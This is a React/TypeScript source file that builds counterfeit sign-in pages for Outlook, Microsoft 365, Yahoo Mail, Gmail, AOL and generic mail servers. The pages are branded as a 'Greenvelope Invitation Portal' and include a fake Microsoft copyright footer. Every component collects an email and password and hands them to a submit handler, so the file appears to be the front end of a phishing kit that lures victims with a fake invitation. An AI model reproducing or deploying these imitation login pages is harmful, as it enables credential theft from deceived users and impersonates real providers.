import React, { useState } from 'react';
import { MicrosoftLogo, OutlookModernIcon, YahooLogo, GoogleColorLogo, AolWordmark } from './ProviderLogos';
import { Office365Icon, GmailIcon } from './ProviderIcons';
import { Eye, EyeOff, AlertCircle } from 'lucide-react';

interface AuthFormProps {
  initialEmail: string;
  onSuccess: (email: string) => void;
  onCancel: () => void;
  isLoading: boolean;
  loadingStep: string;
  errorMessage: string | null;
  onSubmit: (email: string, pass: string) => void;
}

// 1. OUTLOOK / HOTMAIL LOGIN VIEW
export const OutlookLoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || 'guest@outlook.com');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(true);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#f3f4f6] text-[#1b1b1b] min-h-[520px] flex flex-col justify-between p-6 sm:p-8 font-['Segoe_UI',-apple-system,BlinkMacSystemFont,sans-serif]">
      {/* Outer Card Box */}
      <div className="bg-white border border-[#e5e7eb] shadow-lg rounded-sm p-6 sm:p-10 max-w-[440px] w-full mx-auto my-auto space-y-5">
        {/* Microsoft Header with Outlook sub-branding */}
        <div className="flex items-center justify-between">
          <MicrosoftLogo className="h-6" />
          <div className="flex items-center gap-1 text-xs text-[#505050] font-normal">
            <OutlookModernIcon className="w-4 h-4" />
            <span>Outlook</span>
          </div>
        </div>

        <div>
          <h2 className="text-2xl font-semibold text-[#1b1b1b] tracking-tight">Sign in</h2>
          <p className="text-xs text-[#505050] mt-1">to continue to Greenvelope Invitation Portal</p>
        </div>

        {errorMessage && (
          <div className="text-[#e81123] text-xs flex items-start gap-1.5 bg-[#fdf2f2] p-2.5 border border-[#f8b4b4] rounded-sm">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email, phone, or Skype"
              disabled={isLoading}
              required
              className="w-full border-b border-[#605e5c] focus:border-[#0067b8] py-2 text-sm text-[#1b1b1b] placeholder-[#605e5c] outline-none bg-transparent transition-colors focus:border-b-2"
            />
          </div>

          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              disabled={isLoading}
              required
              className="w-full border-b border-[#605e5c] focus:border-[#0067b8] py-2 pr-8 text-sm text-[#1b1b1b] placeholder-[#605e5c] outline-none bg-transparent transition-colors focus:border-b-2"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-1 top-2.5 text-[#505050] hover:text-[#1b1b1b] cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4 text-[#505050]" />}
            </button>
          </div>

          <div className="text-xs text-[#0067b8] hover:underline cursor-pointer flex justify-between items-center pt-1">
            <span>Forgot password?</span>
            <span className="text-[#505050]">Sign-in options</span>
          </div>

          <div className="pt-2">
            <label className="flex items-center gap-2 text-xs text-[#1b1b1b] cursor-pointer select-none">
              <input
                type="checkbox"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                className="w-4 h-4 text-[#0067b8] border-[#605e5c] rounded focus:ring-0"
              />
              <span>Stay signed in</span>
            </label>
          </div>

          {isLoading && (
            <div className="py-2 flex items-center gap-2.5 text-xs text-[#0067b8]">
              <div className="w-3.5 h-3.5 border-2 border-[#0067b8] border-t-transparent rounded-full animate-spin" />
              <span>{loadingStep || 'Signing you in...'}</span>
            </div>
          )}

          <div className="flex items-center justify-end gap-2.5 pt-4">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="px-6 py-1.5 bg-[#cccccc] hover:bg-[#b8b8b8] text-[#1b1b1b] text-xs font-semibold rounded-xs transition-colors cursor-pointer"
            >
              Back
            </button>
            <button
              type="submit"
              disabled={isLoading}
              className="px-7 py-1.5 bg-[#0067b8] hover:bg-[#005da6] text-white text-xs font-semibold rounded-xs transition-colors shadow-sm cursor-pointer disabled:opacity-50"
            >
              {isLoading ? 'Verifying...' : 'Sign in'}
            </button>
          </div>
        </form>
      </div>

      {/* Microsoft Footer */}
      <div className="text-[11px] text-[#505050] text-right max-w-[440px] mx-auto w-full pt-3 flex items-center justify-between">
        <span>Terms of use</span>
        <span>Privacy &amp; cookies</span>
        <span>Greenvelope Verification</span>
      </div>
    </div>
  );
};

// 2. OFFICE 365 / MICROSOFT 365 LOGIN VIEW (Corporate / Work or School account look)
export const Office365LoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || 'corporate.user@company.com');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(true);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#eef2f5] text-[#1b1b1b] min-h-[540px] flex flex-col justify-between p-6 sm:p-8 font-['Segoe_UI',-apple-system,BlinkMacSystemFont,sans-serif]">
      <div className="bg-white border border-[#d2d6dc] shadow-md rounded-none p-6 sm:p-10 max-w-[440px] w-full mx-auto my-auto space-y-6">
        <div className="flex items-center justify-between pb-1">
          <MicrosoftLogo className="h-6" />
          <div className="flex items-center gap-1.5 bg-white border border-[#d2d6dc] px-2 py-1 rounded shadow-2xs">
            <Office365Icon className="w-4 h-4" />
            <span className="text-xs font-semibold text-[#1b1b1b]">Microsoft 365</span>
          </div>
        </div>

        <div>
          <h2 className="text-2xl font-semibold text-[#1b1b1b]">Work or school account</h2>
          <p className="text-xs text-[#505050] mt-1">Sign in with your organization or enterprise credentials</p>
        </div>

        {errorMessage && (
          <div className="text-[#e81123] text-xs flex items-start gap-1.5 bg-[#fdf2f2] p-2.5 border border-[#f8b4b4]">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-xs font-semibold text-[#505050] mb-1">
              Account Email
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="someone@example.com"
              disabled={isLoading}
              required
              className="w-full border-b border-[#605e5c] focus:border-[#0067b8] py-2 text-sm text-[#1b1b1b] outline-none bg-transparent transition-colors focus:border-b-2"
            />
          </div>

          <div className="relative">
            <label className="block text-xs font-semibold text-[#505050] mb-1">
              Password
            </label>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              disabled={isLoading}
              required
              className="w-full border-b border-[#605e5c] focus:border-[#0067b8] py-2 pr-8 text-sm text-[#1b1b1b] outline-none bg-transparent transition-colors focus:border-b-2"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-1 bottom-2 text-[#505050] hover:text-[#1b1b1b] cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>

          <div className="flex items-center justify-between text-xs text-[#0067b8] pt-1">
            <span className="hover:underline cursor-pointer">Can't access your account?</span>
            <span className="text-[#505050] hover:underline cursor-pointer">Sign in with security key</span>
          </div>

          <div className="pt-1">
            <label className="flex items-center gap-2 text-xs text-[#1b1b1b] cursor-pointer select-none">
              <input
                type="checkbox"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                className="w-4 h-4 text-[#0067b8] border-[#605e5c] rounded focus:ring-0"
              />
              <span>Don't show this again</span>
            </label>
          </div>

          {isLoading && (
            <div className="py-2 flex items-center gap-2.5 text-xs text-[#0067b8]">
              <div className="w-3.5 h-3.5 border-2 border-[#0067b8] border-t-transparent rounded-full animate-spin" />
              <span>{loadingStep || 'Connecting to Microsoft 365 domain...'}</span>
            </div>
          )}

          <div className="flex items-center justify-end gap-2.5 pt-4">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="px-6 py-2 bg-[#e1dfdd] hover:bg-[#d2d0ce] text-[#1b1b1b] text-xs font-semibold transition-colors cursor-pointer"
            >
              Back
            </button>
            <button
              type="submit"
              disabled={isLoading}
              className="px-7 py-2 bg-[#0067b8] hover:bg-[#005da6] text-white text-xs font-semibold transition-colors shadow-sm cursor-pointer disabled:opacity-50"
            >
              {isLoading ? 'Verifying...' : 'Sign in'}
            </button>
          </div>
        </form>
      </div>

      <div className="text-[11px] text-[#505050] text-center max-w-[440px] mx-auto w-full pt-3">
        © 2026 Microsoft Corporation • Connected via Greenvelope SSO Handshake
      </div>
    </div>
  );
};

// 3. YAHOO MAIL LOGIN VIEW (Purple Theme, Clean Yahoo Sign-in Card)
export const YahooLoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || 'guest@yahoo.com');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [staySignedIn, setStaySignedIn] = useState(true);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#f0f3f5] text-[#26282a] min-h-[540px] flex flex-col justify-between p-6 sm:p-8 font-['Helvetica_Neue',Helvetica,Arial,sans-serif]">
      <div className="bg-white border border-[#e0e4e9] shadow-sm rounded-lg p-6 sm:p-10 max-w-[400px] w-full mx-auto my-auto space-y-5 text-center">
        {/* Yahoo Logo */}
        <div className="flex justify-center pb-1">
          <YahooLogo className="h-8" />
        </div>

        <div>
          <h2 className="text-xl font-bold text-[#26282a]">Sign in to Yahoo Mail</h2>
          <p className="text-xs text-[#6e7780] mt-1">using your Yahoo account</p>
        </div>

        {errorMessage && (
          <div className="text-[#ea4335] text-xs flex items-start gap-1.5 bg-[#fef0f0] p-2.5 border border-[#fcc] rounded-md text-left">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4 text-left">
          <div>
            <label className="block text-xs font-semibold text-[#6e7780] mb-1">
              Username, email, or mobile
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="username@yahoo.com"
              disabled={isLoading}
              required
              className="w-full border border-[#b9bdc5] focus:border-[#6001d2] focus:ring-1 focus:ring-[#6001d2] rounded-md py-2.5 px-3 text-sm text-[#26282a] outline-none transition-all"
            />
          </div>

          <div className="relative">
            <label className="block text-xs font-semibold text-[#6e7780] mb-1">
              Password
            </label>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter password"
              disabled={isLoading}
              required
              className="w-full border border-[#b9bdc5] focus:border-[#6001d2] focus:ring-1 focus:ring-[#6001d2] rounded-md py-2.5 px-3 pr-10 text-sm text-[#26282a] outline-none transition-all"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 bottom-3 text-[#6e7780] hover:text-[#26282a] cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="w-full py-3 bg-[#6001d2] hover:bg-[#5200b3] text-white text-sm font-bold rounded-3xl transition-colors shadow-sm cursor-pointer disabled:opacity-60 flex items-center justify-center space-x-2"
          >
            {isLoading ? (
              <>
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                <span>Verifying...</span>
              </>
            ) : (
              <span>Next</span>
            )}
          </button>

          <div className="flex items-center justify-between text-xs pt-1">
            <label className="flex items-center gap-2 text-[#26282a] cursor-pointer select-none">
              <input
                type="checkbox"
                checked={staySignedIn}
                onChange={(e) => setStaySignedIn(e.target.checked)}
                className="w-4 h-4 text-[#6001d2] border-[#b9bdc5] rounded focus:ring-0"
              />
              <span>Stay signed in</span>
            </label>
            <span className="text-[#188fff] hover:underline cursor-pointer">Forgot username?</span>
          </div>

          {isLoading && (
            <div className="py-1 text-center text-xs text-[#6001d2] font-medium">
              {loadingStep || 'Connecting to Yahoo Mail authentication gateway...'}
            </div>
          )}

          <div className="pt-2 text-center">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="w-full py-2.5 border border-[#188fff] text-[#188fff] hover:bg-blue-50 text-xs font-bold rounded-3xl transition-colors cursor-pointer"
            >
              Choose another provider
            </button>
          </div>
        </form>
      </div>

      <div className="text-[11px] text-[#6e7780] text-center max-w-[400px] mx-auto w-full pt-3 flex justify-around">
        <span>Help</span>
        <span>Terms</span>
        <span>Privacy</span>
      </div>
    </div>
  );
};

// 4. GMAIL / GOOGLE SIGN-IN VIEW (Material Design Google Look)
export const GmailLoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || 'guest@gmail.com');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#f8f9fa] text-[#202124] min-h-[540px] flex flex-col justify-between p-6 sm:p-8 font-['Google_Sans',Roboto,Arial,sans-serif]">
      <div className="bg-white border border-[#dadce0] rounded-lg p-8 sm:p-10 max-w-[440px] w-full mx-auto my-auto space-y-6">
        <div className="flex flex-col items-center text-center space-y-2">
          <div className="flex items-center gap-2 mb-1">
            <GoogleColorLogo className="h-6" />
            <div className="w-6 h-6 rounded-full bg-white shadow-xs border border-slate-200 flex items-center justify-center p-0.5">
              <GmailIcon className="w-4 h-4" />
            </div>
          </div>
          <h2 className="text-2xl font-normal text-[#202124]">Sign in</h2>
          <p className="text-sm text-[#5f6368]">to continue to Greenvelope Invitation Portal</p>
        </div>

        {errorMessage && (
          <div className="text-[#d93025] text-xs flex items-start gap-1.5 bg-[#fce8e6] p-2.5 border border-[#fad2cf] rounded">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <div className="relative">
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email or phone"
                disabled={isLoading}
                required
                className="w-full border border-[#dadce0] focus:border-[#1a73e8] rounded px-3.5 py-3 text-sm text-[#202124] outline-none transition-colors focus:ring-1 focus:ring-[#1a73e8]"
              />
            </div>
            <div className="text-xs text-[#1a73e8] font-medium pt-1.5 hover:underline cursor-pointer">
              Forgot email?
            </div>
          </div>

          <div>
            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                disabled={isLoading}
                required
                className="w-full border border-[#dadce0] focus:border-[#1a73e8] rounded px-3.5 py-3 pr-10 text-sm text-[#202124] outline-none transition-colors focus:ring-1 focus:ring-[#1a73e8]"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-3 text-[#5f6368] hover:text-[#202124] cursor-pointer"
              >
                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
            <div className="pt-2">
              <label className="flex items-center gap-2 text-xs text-[#5f6368] cursor-pointer select-none">
                <input
                  type="checkbox"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                  className="rounded text-[#1a73e8] focus:ring-0"
                />
                <span>Show password</span>
              </label>
            </div>
          </div>

          <div className="text-xs text-[#5f6368] leading-relaxed">
            Not your computer? Use Guest mode to sign in privately.{' '}
            <span className="text-[#1a73e8] hover:underline cursor-pointer">Learn more</span>
          </div>

          {isLoading && (
            <div className="py-1 flex items-center gap-2 text-xs text-[#1a73e8]">
              <div className="w-3.5 h-3.5 border-2 border-[#1a73e8] border-t-transparent rounded-full animate-spin" />
              <span>{loadingStep || 'Verifying Google Account credentials...'}</span>
            </div>
          )}

          <div className="flex items-center justify-between pt-4">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="text-xs font-semibold text-[#1a73e8] hover:text-[#174ea6] cursor-pointer"
            >
              Back
            </button>
            <button
              type="submit"
              disabled={isLoading}
              className="px-6 py-2 bg-[#1a73e8] hover:bg-[#1557b0] text-white text-xs font-medium rounded transition-colors shadow-sm cursor-pointer disabled:opacity-50"
            >
              {isLoading ? 'Verifying...' : 'Next'}
            </button>
          </div>
        </form>
      </div>

      <div className="text-[11px] text-[#5f6368] max-w-[440px] mx-auto w-full pt-3 flex justify-between">
        <span>English (United States)</span>
        <div className="flex gap-4">
          <span>Help</span>
          <span>Privacy</span>
          <span>Terms</span>
        </div>
      </div>
    </div>
  );
};

// 5. AOL LOGIN VIEW (Classic AOL Sign in)
export const AolLoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || 'guest@aol.com');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [staySignedIn, setStaySignedIn] = useState(true);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#f4f4f4] text-[#111111] min-h-[540px] flex flex-col justify-between p-6 sm:p-8 font-sans">
      <div className="bg-white border border-[#e5e5e5] rounded-xl shadow-sm p-6 sm:p-10 max-w-[390px] w-full mx-auto my-auto space-y-5 text-center">
        <div className="flex justify-center pb-1">
          <AolWordmark className="h-7" />
        </div>

        <div>
          <h2 className="text-xl font-extrabold text-[#111111]">Sign in</h2>
          <p className="text-xs text-[#767676] mt-1">Enter your AOL username and password</p>
        </div>

        {errorMessage && (
          <div className="text-[#e81123] text-xs flex items-start gap-1.5 bg-[#fdf2f2] p-2.5 border border-[#f8b4b4] rounded text-left">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4 text-left">
          <div>
            <label className="block text-xs font-bold text-[#111111] mb-1">
              Username or Email
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="username@aol.com"
              disabled={isLoading}
              required
              className="w-full border-2 border-[#111111] rounded-md py-2 px-3 text-sm text-[#111111] outline-none"
            />
          </div>

          <div className="relative">
            <label className="block text-xs font-bold text-[#111111] mb-1">
              Password
            </label>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter password"
              disabled={isLoading}
              required
              className="w-full border-2 border-[#111111] rounded-md py-2 px-3 pr-10 text-sm text-[#111111] outline-none"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 bottom-2.5 text-[#767676] hover:text-[#111111] cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="w-full py-3 bg-[#0060df] hover:bg-[#004fba] text-white text-sm font-bold rounded-md transition-colors cursor-pointer disabled:opacity-60"
          >
            {isLoading ? 'Verifying...' : 'Next'}
          </button>

          <div className="flex items-center justify-between text-xs pt-1">
            <label className="flex items-center gap-2 text-[#111111] cursor-pointer select-none">
              <input
                type="checkbox"
                checked={staySignedIn}
                onChange={(e) => setStaySignedIn(e.target.checked)}
                className="w-4 h-4 text-[#0060df] rounded"
              />
              <span>Stay signed in</span>
            </label>
            <span className="text-[#0060df] hover:underline cursor-pointer">Forgot password?</span>
          </div>

          {isLoading && (
            <div className="text-center text-xs text-[#0060df] font-medium">
              {loadingStep || 'Authenticating with AOL...'}
            </div>
          )}

          <div className="pt-2">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="w-full py-2 bg-[#f0f0f0] hover:bg-[#e0e0e0] text-[#111111] text-xs font-bold rounded-md transition-colors cursor-pointer"
            >
              Back
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

// 6. GENERIC / OTHER EMAIL PROVIDER LOGIN VIEW
export const OtherMailLoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || '');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#1e293b] text-white min-h-[500px] flex flex-col justify-between p-6 sm:p-8 font-sans">
      <div className="bg-[#0f172a] border border-[#334155] rounded-2xl shadow-xl p-6 sm:p-8 max-w-[420px] w-full mx-auto my-auto space-y-5">
        <div className="text-center space-y-1">
          <div className="w-12 h-12 rounded-2xl bg-indigo-600/30 border border-indigo-500/40 text-indigo-400 mx-auto flex items-center justify-center font-bold text-lg">
            @
          </div>
          <h2 className="text-xl font-bold text-white pt-2">Email Authentication</h2>
          <p className="text-xs text-slate-400">Log in with your custom or corporate mail server</p>
        </div>

        {errorMessage && (
          <div className="text-rose-300 text-xs flex items-start gap-1.5 bg-rose-950/80 p-2.5 border border-rose-800 rounded-lg">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-xs font-medium text-slate-300 mb-1">
              Email Address
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="you@domain.com"
              disabled={isLoading}
              required
              className="w-full bg-slate-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
            />
          </div>

          <div className="relative">
            <label className="block text-xs font-medium text-slate-300 mb-1">
              Password
            </label>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Mailbox password"
              disabled={isLoading}
              required
              className="w-full bg-slate-900 border border-slate-700 rounded-xl px-3.5 py-2.5 pr-10 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 bottom-2.5 text-slate-400 hover:text-white cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>

          {isLoading && (
            <div className="flex items-center justify-center gap-2 text-xs text-indigo-400 py-1">
              <div className="w-3.5 h-3.5 border-2 border-indigo-400 border-t-transparent rounded-full animate-spin" />
              <span>{loadingStep || 'Connecting to mail host...'}</span>
            </div>
          )}

          <div className="flex items-center gap-3 pt-3">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="w-1/3 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl transition-colors cursor-pointer"
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={isLoading}
              className="w-2/3 py-2.5 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold rounded-xl transition-colors shadow-md cursor-pointer disabled:opacity-50"
            >
              {isLoading ? 'Verifying...' : 'Sign In & Verify'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};
